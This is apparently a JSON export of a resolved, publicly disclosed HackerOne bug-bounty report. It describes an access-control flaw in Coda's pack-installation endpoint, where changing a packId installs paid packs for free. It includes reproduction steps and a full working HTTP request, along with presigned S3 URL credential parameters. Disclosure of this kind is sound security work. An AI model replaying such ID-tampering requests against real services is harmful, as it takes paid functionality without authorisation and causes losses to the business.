{
  "id": 777942,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83Nzc5NDI=",
  "url": "https://hackerone.com/reports/777942",
  "title": "Unrestricted access to any \"connected pack\" on docs",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2020-01-19T17:44:40.327Z",
  "submitted_at": "2020-01-19T17:44:40.327Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "0xcrypto",
    "url": "/0xcrypto",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/4um1gc3qqb0oavthynukysvj95hu/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c?response-content-disposition=inline%3B%20filename%3D%22Screenshot_20210608-153535_WhatsApp.jpg%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_20210608-153535_WhatsApp.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6PGWSTMP%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T133541Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCViOi%2F56ueEuvIwenQe%2BLb%2BwbBeFYt95o%2B27q1gAyjJQIhAJy41GZeNB%2F35zQFEMMldvRn9RKuTJ921mYFGjWXM4xOKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5Igyfj5amkH4Q4qV17RUqjwW2CAxiK4m4hWEAlsDvzI4tTbj8wtQkEbV8t3TJ6TszDYzbxoZfKv%2FF1ngpPiZtnooExkiPG26fSsSPVxr95a5R%2Bb53aIMfs4cvspAbjO408u%2FKZN5zXVPh6CnfCbsN8F6X%2F9KN%2Fbv66jc7vpds0BIK8%2B6fFbH50L%2BJ7loxPgYJpwQKPGA%2BxAU3n4cW0xu40kEa4HScwwT%2BqFoMNkHSPq7v%2FMX6cc1VRdiCryuyIqwF%2Bs0t%2FvdjeVHg78LS0%2FuMMNkbwDSMNufKbDqARDuoU0P%2F7njwSrXV5%2BkRLbGbe0L89dhffkGntr%2Bd%2FtQ8CCYU66m%2FjoL0k41lI2HeR3O7pLZw6xc3baudQgvKzzU8naKjeMtCWmGIlkN1deTGbW6VWFv94mPhh6xqwYF%2FygK1ASZXWcjKuCZDkbIOgvNsJXfi9GobE%2Fg%2FQCvqFLRdBFuYpEHQ%2BmeEDcfMacgRXA297IImF0dUJN85r5YBUSsTgEED3A1n%2BDuZ7EYlyHsa0FOqtqBvavx526YAyqmogm2M05wZ7943732ur203IxCn9N2G019Q9wlJDIhQKk2ujbfG2QJJ9kcZT0%2FclqOtb7n1O02fUwDgOTGWF7a6VW3W7hV6bjCy%2B5Rac9PzkS6VymX8vtLX1k%2FZgwFkOteSUd2%2FRZ6WSu3ZzHNAUkrRcuUOocwK48DWkjTuzKGjaWSycV5T7TkIYO82PSRCe3%2FO3LFd%2F1MQ3Lt2TctQHWcm%2FuYG8L64tYNCvpptkP4lbIEMyLovg2Tcvod1IiJWSFCfdjo3%2F62cnjstu7oIkOgQE1rNQRi7tl%2BOpOZ3O2p1%2BkSM9%2F0IDEkXXc43X4wqyrJxFCXTAgtGobNnX8BPw1JLWKKzcjvCMLC1ra4GOrABG6HOSlDmK1pVHFgvG0UCsHX0y77qrI5WogVE2SsoeRtdX%2BFgr0TJVFxF%2FqzndNjCSF1CE7s5o1cvQRnubzfIEHh%2Bql4Yr2YDxqHDFub6HZHglXezaL0SQVMK924Vna4%2Fd7oHIUZe52JuzZ8HuqQcy4plSO1mkvy6u0L4T%2F1njIpact7INdijf%2B1WFhWhjy0qA%2BmL%2BCVvUwMMaTaqrHm4JzWtOGywBhoyvrV0SfdDvYQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=419148ab5c7ef843914fdde011e2ddf314b083ca779dbdc094a152522a5bff71"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 39147,
    "url": "https://hackerone.com/coda_bbp",
    "handle": "coda_bbp",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/039/147/3e9abb15fd44d364489e53107b52a7ebc53f2a7e_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/147/3e9abb15fd44d364489e53107b52a7ebc53f2a7e_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Coda",
      "twitter_handle": "coda_hq",
      "website": "https://coda.io/",
      "about": "The doc that brings words, data, & teams together."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2020-04-14T22:42:49.113Z",
  "bug_reporter_agreed_on_going_public_at": "2020-03-19T02:44:18.340Z",
  "team_member_agreed_on_going_public_at": "2020-04-14T22:42:48.978Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nWhen adding a pack, a post request is sent to ```https://coda.io/internalAppApi/documents/[doc ID]/packs``` with data ```{\"packId\":[pack Id]}``` where doc ID is the id of doc user wishes to add pack and pack ID is the pack user wants to install.\nBut this request is unrestricted and the user can iterate over packId to get any free/pro/disabled pack.\n\n## Steps To Reproduce:\n  1. Capture the post request while installing any pack using a proxy like Burp when you are logged in.\n  2. Change packId to desired pack's ID. A valid packId gives a 200 status and invalid gives 400.\n\nThe below post request contains packId of Google Translate Pack which is a pro pack.\n\n```\nPOST /internalAppApi/documents/F5Y1qJ3aw-/packs HTTP/1.1\nHost: coda.io\nConnection: close\nContent-Length: 15\nAccept: application/json\nOrigin: https://coda.io\nX-Csrf-Token: InEwS0Z2U21xR09JUDI2Qkwi\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\nContent-Type: application/json\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nReferer: https://coda.io/d/Untitled_dF5Y1qJ3aw-/asdf_suTAx\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: /* Your Cookie */\n\n{\"packId\":1063}\n```\n\nSending the request should return a 200 OK. Check the doc, the pro pack is installed.\n\n[This doc](https://coda.io/d/Untitled_dNvxRin_XtJ) created by 0x00cryptohackeronetester@gmail.com uses Google Translate pro pack without upgrading. Installing the pro pack gives a 14 days warning. I am not sure if it will expire and become read only.\n\n## Impact\n\nAllows anyone to use paid functionality for free causing loss to business.",
  "weakness": {
    "id": 26,
    "name": "Improper Access Control - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2020-04-18T02:44:18.489Z",
  "allow_singular_disclosure_after": -120653483.44738556,
  "singular_disclosure_allowed": true,
  "vote_count": 25,
  "voters": [
    "v3ntur4x",
    "sourc7",
    "mashoud1122",
    "dreyand_",
    "ali",
    "mik317",
    "sudi",
    "what_web",
    "m7mdharoun",
    "confidence-remains-high",
    "and 15 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 4.3,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "none",
      "integrity": "low",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 23170,
    "asset_type": "WILDCARD",
    "asset_identifier": "https://coda.io/*",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
